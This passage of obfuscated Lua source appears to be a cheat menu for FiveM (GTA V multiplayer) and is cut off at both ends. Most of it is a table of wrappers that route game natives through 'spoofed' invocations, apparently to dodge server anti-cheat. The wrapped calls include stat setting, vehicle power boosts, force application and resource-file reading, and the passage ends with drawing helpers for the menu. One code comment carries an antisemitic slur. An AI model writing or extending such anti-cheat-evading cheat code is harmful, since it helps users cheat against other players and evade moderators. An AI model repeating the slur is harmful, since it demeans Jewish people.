            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextDropshadow'], distance, r, g, b, a)
        end,
        SetTextEdge = function(p0, r, g, b, a)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextEdge'], p0, r, g, b, a)
        end,
        SetTextOutline = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextOutline'])
        end,
        SetTextEntry = function(text)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTextEntry'], RfPsUKHSFWJuBEJuz.rE.LumToString(text))
        end,
        AddTextComponentString = function(text)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddTextComponentString'], RfPsUKHSFWJuBEJuz.rE.LumToString(text))
        end,
        DrawText = function(x, y)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DrawText'], x, y)
        end,
        ClearDrawOrigin = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ClearDrawOrigin'])
        end,
        GetClosestVehicle = function(x, y, z, radius, modelHash, flags)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetClosestVehicle'], x, y, z, radius, RfPsUKHSFWJuBEJuz.rE.LumHash(modelHash), flags, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetGameplayCamRelativeHeading = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGameplayCamRelativeHeading'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        GetGameplayCamRelativePitch = function()
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGameplayCamRelativePitch'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        GetPedPropIndex = function(ped, componentId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedPropIndex'], ped, componentId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPedPropTextureIndex = function(ped, componentId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedPropTextureIndex'], ped, componentId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPedDrawableVariation = function(ped, componentId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedDrawableVariation'], ped, componentId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPedPaletteVariation = function(ped, componentId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedPaletteVariation'], ped, componentId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetPedTextureVariation = function(ped, componentId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedTextureVariation'], ped, componentId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        RequestAnimDict = function(animDict)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RequestAnimDict'], RfPsUKHSFWJuBEJuz.rE.LumToString(animDict))
        end,
        HasAnimDictLoaded = function(animDict)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HasAnimDictLoaded'], RfPsUKHSFWJuBEJuz.rE.LumToString(animDict), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        TaskPlayAnim = function(ped, animDictionary, animationName, blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lockX, lockY, lockZ)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskPlayAnim'], ped, RfPsUKHSFWJuBEJuz.rE.LumToString(animDictionary), RfPsUKHSFWJuBEJuz.rE.LumToString(animationName), blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lockX, lockY, lockZ)
        end,
        SetNewWaypoint = function(x, y)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetNewWaypoint'], x, y)
        end,
        NetworkIsPlayerActive = function(player)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkIsPlayerActive'], player, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetBlipFromEntity = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetBlipFromEntity'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        AddBlipForEntity = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddBlipForEntity'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetBlipSprite = function(blip, spriteId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipSprite'], blip, spriteId)
        end,
        ShowHeadingIndicatorOnBlip = function(blip, toggle)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ShowHeadingIndicatorOnBlip'], blip, toggle)
        end,
        GetBlipSprite = function(blip)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetBlipSprite'], blip, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetEntityHealth = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetEntityHealth'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        HideNumberOnBlip = function(blip)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['HideNumberOnBlip'], blip)
        end,
        SetBlipRotation = function(blip, rotation)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipRotation'], blip, rotation)
        end,
        SetBlipNameToPlayerName = function(blip, player)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipNameToPlayerName'], blip, player)
        end,
        SetBlipScale = function(blip, scale)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipScale'], blip, scale)
        end,
        IsPauseMenuActive = function()
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsPauseMenuActive'], RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetBlipAlpha = function(blip, alpha)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipAlpha'], blip, alpha)
        end,
        RemoveBlip = function(blip)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RemoveBlip'], RfPsUKHSFWJuBEJuz.rE.LumII(blip))
        end,
        GetGameTimer = function()
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGameTimer'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetEntityAlpha = function(entity, alphaLevel, skin)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityAlpha'], entity, alphaLevel, skin)
        end,
        SetEntityCollision = function(entity, toggle, keepPhysics)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetEntityCollision'], entity, toggle, keepPhysics)
        end,
        SetTransitionTimecycleModifier = function(modifierName, transition)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetTransitionTimecycleModifier'], RfPsUKHSFWJuBEJuz.rE.LumToString(modifierName), transition)
        end,
        GetDisplayNameFromVehicleModel = function(modelHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetDisplayNameFromVehicleModel'], RfPsUKHSFWJuBEJuz.rE.LumHash(modelHash), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        SetPedSuffersCriticalHits = function(ped, toggle)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedSuffersCriticalHits'], ped, toggle)
        end,
        SetWeatherTypeNowPersist = function(weatherType)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetWeatherTypeNowPersist'], RfPsUKHSFWJuBEJuz.rE.LumToString(weatherType))
        end,
        IsThisModelABicycle = function(model)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelABicycle'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelABoat = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelABoat'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelAHeli = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelAHeli'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelACar = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelACar'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelAJetski = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelAJetski'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelAPlane = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelAPlane'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelATrain = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelATrain'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelAQuadbike = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelAQuadbike'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelAnAmphibiousCar = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelAnAmphibiousCar'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsThisModelAnAmphibiousQuadbike = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsThisModelAnAmphibiousQuadbike'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        TaskCombatPed = function(ped, targetPed, p2, p3)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskCombatPed'], ped, targetPed, p2, p3)
        end,
        IsPedDeadOrDying = function(ped, p1)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsPedDeadOrDying'], ped, p1, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        TaskSmartFleeCoord = function(ped, x, y, z, distance, time, p6, p7)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskSmartFleeCoord'], ped, x, y, z, distance, time, p6, p7)
        end,
        SetPedCombatAbility = function(ped, p1)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCombatAbility'], ped, p1)
        end,
        SetPedCombatMovement = function(ped, combatMovement)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCombatMovement'], ped, combatMovement)
        end,
        SetCombatFloat = function(ped, combatType, p2)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetCombatFloat'], ped, combatType, p2)
        end,
        SetPedAccuracy = function(ped, accuracy)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedAccuracy'], ped, accuracy, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        SetPedFiringPattern = function(ped, patternHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedFiringPattern'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(patternHash))
        end,
        GetClosestVehicleNodeWithHeading = function(x, y, z, nodeType, p6, p7)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetClosestVehicleNodeWithHeading'], x, y, z, RfPsUKHSFWJuBEJuz.rE.LumPVV(), RfPsUKHSFWJuBEJuz.rE.LumPVF(), nodeType, p6, p7, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        CreatePedInsideVehicle = function(vehicle, pedType, modelHash, seat, isNetwork, netMissionEntity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['CreatePedInsideVehicle'], vehicle, pedType, RfPsUKHSFWJuBEJuz.rE.LumHash(modelHash), seat, isNetwork, netMissionEntity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        TaskVehicleDriveToCoordLongrange = function(ped, vehicle, x, y, z, speed, driveMode, stopRange)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskVehicleDriveToCoordLongrange'], ped, vehicle, x, y, z, speed, driveMode, stopRange)
        end,
        GetWeaponDamage = function(weaponHash, componentHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetWeaponDamage'], RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash), componentHash, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAF())
        end,
        FindFirstVehicle = function(outEntity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['FindFirstVehicle'], RfPsUKHSFWJuBEJuz.rE.LumII(outEntity), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        FindNextVehicle = function(findHandle, outEntity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['FindNextVehicle'], findHandle, RfPsUKHSFWJuBEJuz.rE.LumII(outEntity), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        EndFindVehicle = function(findHandle)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['EndFindVehicle'], findHandle)
        end,
        SetVehicleDoorsLockedForAllPlayers = function(vehicle, toggle)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleDoorsLockedForAllPlayers'], vehicle, toggle)
        end,
        ModifyVehicleTopSpeed = function(vehicle, value)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ModifyVehicleTopSpeed'], vehicle, value)
        end,
        SetVehicleCheatPowerIncrease = function(vehicle, value)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleCheatPowerIncrease'], vehicle, value)
        end,
        RemoveWeaponFromPed = function(ped, weaponHash)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['RemoveWeaponFromPed'], ped, RfPsUKHSFWJuBEJuz.rE.LumHash(weaponHash))
        end,
        DrawLine = function(x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DrawLine'], x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
        end,
        DrawMarker = function(type, posX, posY, posZ, dirX, dirY, dirZ, rotX, rotY, rotZ, scaleX, scaleY, scaleZ, red, green, blue, alpha, bobUpAndDown, faceCamera, p19, rotate, textureDict, textureName, drawOnEnts)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['DrawMarker'], type, posX, posY, posZ, dirX, dirY, dirZ, rotX, rotY, rotZ, scaleX, scaleY, scaleZ, red, green, blue, alpha, bobUpAndDown, faceCamera, p19, rotate, nil, nil, drawOnEnts)
        end,
        GetEntityVelocity = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetEntityVelocity'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        ApplyForceToEntity = function(entity, forceType, x, y, z, offX, offY, offZ, boneIndex, isDirectionRel, ignoreUpVec, isForceRel, p12, p13)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ApplyForceToEntity'], entity, forceType, x, y, z, offX, offY, offZ, boneIndex, isDirectionRel, ignoreUpVec, isForceRel, p12, p13)
        end,
        GetGameplayCamCoord = function()
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetGameplayCamCoord'], RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAV())
        end,
        SetPedToRagdoll = function(ped, time1, time2, ragdollType, p4, p5, p6)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedToRagdoll'], ped, time1, time2, ragdollType, p4, p5, p6, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        StatSetInt = function(statName, value, save)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['StatSetInt'], RfPsUKHSFWJuBEJuz.rE.LumHash(statName), value, save, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetBlipCoords = function(blip, posX, posY, posZ)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipCoords'], blip, posX, posY, posZ)
        end,
        SetBlipCategory = function(blip, index)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetBlipCategory'], blip, index)
        end,
        AddBlipForCoord = function(x, y, z)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['AddBlipForCoord'], x, y, z, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        BeginTextCommandSetBlipName = function(textLabel)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['BeginTextCommandSetBlipName'], RfPsUKHSFWJuBEJuz.rE.LumToString(textLabel))
        end,
        EndTextCommandSetBlipName = function(blip)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['EndTextCommandSetBlipName'], blip)
        end,
        SetPedCanBeKnockedOffVehicle = function(ped, state)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCanBeKnockedOffVehicle'], ped, state)
        end,
        IsEntityAPed = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsEntityAPed'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsEntityAVehicle = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsEntityAVehicle'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsEntityAnObject = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsEntityAnObject'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        IsModelAPed = function(model)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsModelAPed'], RfPsUKHSFWJuBEJuz.rE.LumHash(model), RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetVehicleDoorsLocked = function(vehicle, doorLockStatus)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleDoorsLocked'], vehicle, doorLockStatus)
        end,
        TaskVehicleTempAction = function(p0, p1, p2, p3)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskVehicleTempAction'], p0, p1, p2, p3)
        end,
        LoadResourceFile = function(resourceName, fileName)
            return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['LoadResourceFile'], RfPsUKHSFWJuBEJuz.rE.LumToString(resourceName), RfPsUKHSFWJuBEJuz.rE.LumToString(fileName), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        ResetEntityAlpha = function(entity)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['ResetEntityAlpha'], entity, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        NetworkGetPlayerIndexFromPed = function(ped)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['NetworkGetPlayerIndexFromPed'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        IsPedAPlayer = function(ped)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['IsPedAPlayer'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetPedSourceOfDeath = function(ped)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPedSourceOfDeath'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetNumResourceMetadata = function(resourceName, metadataKey)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetNumResourceMetadata'], RfPsUKHSFWJuBEJuz.rE.LumToString(resourceName), RfPsUKHSFWJuBEJuz.rE.LumToString(metadataKey), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        GetResourceMetadata = function(resourceName, metadataKey, index)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetResourceMetadata'], RfPsUKHSFWJuBEJuz.rE.LumToString(resourceName), RfPsUKHSFWJuBEJuz.rE.LumToString(metadataKey), index, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAS())
        end,
        SetVehicleAlarmTimeLeft = function(vehicle, time)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleAlarmTimeLeft'], vehicle, time)
        end,
        GetIsVehicleEngineRunning = function(vehicle)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetIsVehicleEngineRunning'], vehicle, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        SetVehicleUndriveable = function(vehicle, toggle)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetVehicleUndriveable'], vehicle, toggle)
        end,
        TaskVehicleDriveToCoord = function(ped, vehicle, x, y, z, speed, p6, vehicleModel, drivingMode, stopRange, p10)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskVehicleDriveToCoord'], ped, vehicle, x, y, z, speed, p6, RfPsUKHSFWJuBEJuz.rE.LumHash(vehicleModel), drivingMode, stopRange, p10)
        end,
        SetPedCombatRange = function(ped, p1)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['SetPedCombatRange'], ped, p1)
        end,
        GetIsTaskActive = function(ped, taskNumber)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetIsTaskActive'], ped, taskNumber, RfPsUKHSFWJuBEJuz.rE.LumRRA())
        end,
        GetPlayerFromServerId = function(serverId)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetPlayerFromServerId'], serverId, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        PedToNet = function(ped)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['PedToNet'], ped, RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
        end,
        TaskVehicleDriveWander = function(ped, vehicle, speed, drivingStyle)
	        return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['TaskVehicleDriveWander'], ped, vehicle, speed, drivingStyle)
        end,
    }
}

-- So we can put like config info and other JewPed values that need to be held in this table --
-- fun functions live here --
local jrnyLearIyzKiSIen = {
    func = {
        DrawRectangle = function(x, y, w, h, r, g, b, a)
            local resx, resy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
            local rectw, recth = w / resx, h / resy
            local rectx, recty = x / resx + rectw / 2, y / resy + recth / 2
            return nlFXKkFxuKQAk.natives.DrawRect(rectx, recty, rectw, recth, r, g, b, a)
        end,
        DrawSomeSprite = function(x, y, w, h, heading, dict, name, r, g, b, a, custom)
            local resx, resy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
            if not nlFXKkFxuKQAk.natives.HasStreamedTextureDictLoaded(dict) and not custom then
                nlFXKkFxuKQAk.natives.RequestStreamedTextureDict(dict)
            end
    
            nlFXKkFxuKQAk.natives.DrawSprite(dict, name, x / resx, y / resy, w / resx, h / resy, heading, r, g, b, a)
        end,
        DrawSomeText = function(text, font, centered, x, y, scale, r, g, b, a)
            local resx, resy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
            nlFXKkFxuKQAk.natives.SetTextFont(font)
            nlFXKkFxuKQAk.natives.SetTextScale(scale, scale)  
            nlFXKkFxuKQAk.natives.SetTextCentre(centered)  
            nlFXKkFxuKQAk.natives.SetTextColour(r, g, b, a)
            nlFXKkFxuKQAk.natives.BeginTextCommandDisplayText("STRING")  
